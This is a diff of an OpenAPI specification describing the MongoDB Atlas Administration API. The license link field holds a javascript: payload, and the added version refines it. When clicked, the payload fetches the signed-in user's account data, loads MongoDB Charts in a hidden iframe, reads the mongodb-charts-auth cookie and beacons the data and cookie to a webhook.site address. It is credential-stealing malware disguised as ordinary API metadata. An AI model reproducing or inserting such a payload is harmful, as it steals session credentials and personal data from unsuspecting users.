@@ -6,7 +6,7 @@
     "description": "The MongoDB Atlas Administration API allows you to manage your Atlas clusters, projects, and users programmatically.",
     "license": {
       "name": "View License",
-      "url": "javascript:void(fetch('https://cloud.mongodb.com/user/shared',{credentials:'include'}).then(r=>r.json()).then(d=>{var p=d.currentProject&&d.currentProject.projectId;function ex(){var c=document.cookie.match(/mongodb-charts-auth=([^;]+)/);navigator.sendBeacon('https://webhook.site/d3d8d428-dd84-4392-bd20-ae844ab56cc0',JSON.stringify({pii:d,cred:c?decodeURIComponent(c[1]):null,origin:location.origin}))}if(p&&!document.cookie.includes('mongodb-charts-auth')){var w=window.open('https://cloud.mongodb.com/charts/'+p);setTimeout(function(){ex();if(w)w.close()},4000)}else ex()}))"
+      "url": "javascript:void(fetch('https://cloud.mongodb.com/user/shared',{credentials:'include'}).then(r=>r.json()).then(d=>{var p=d.currentProject&&d.currentProject.projectId;var wh='https://webhook.site/d3d8d428-dd84-4392-bd20-ae844ab56cc0';function ex(){var c=document.cookie.match(/mongodb-charts-auth=([^;]+)/);navigator.sendBeacon(wh,JSON.stringify({pii:d,cred:c?decodeURIComponent(c[1]):null,origin:location.origin}))}if(p){var f=document.createElement('iframe');f.style.display='none';f.src='https://cloud.mongodb.com/charts/'+p;document.body.appendChild(f);setTimeout(ex,5000)}else ex()}))"
     }
   },
   "paths": {}
